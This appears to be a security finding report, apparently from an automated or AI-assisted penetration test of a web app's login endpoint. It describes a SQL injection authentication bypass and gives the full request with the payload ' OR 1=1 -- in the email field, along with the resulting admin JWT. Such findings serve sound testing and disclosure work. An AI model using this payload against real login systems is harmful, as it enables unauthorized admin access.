title: SQL Injection in Login Endpoint (Auth Bypass)
description: The login endpoint is vulnerable to SQL injection. Using payload "' OR 1=1 --" as the email field bypasses authentication and returns a valid JWT token for the first user in the database (typically admin). This allows full authentication bypass and admin access.
poc: POST /rest/user/login with {"email":"' OR 1=1 --","password":"test"} returns 200 with JWT token and user data, demonstrating SQL injection authentication bypass in the email field.
proof: Proof: POST /rest/user/login with body {"email":"' OR 1=1 --","password":"test"} returns HTTP 200 with JSON containing token, bid, and email fields. In contrast, invalid credentials return HTTP 401 with {"error":"Invalid email or password"}. This demonstrates SQL injection authentication bypass. The SQLi payload causes the query to return the first user (admin) regardless of password.
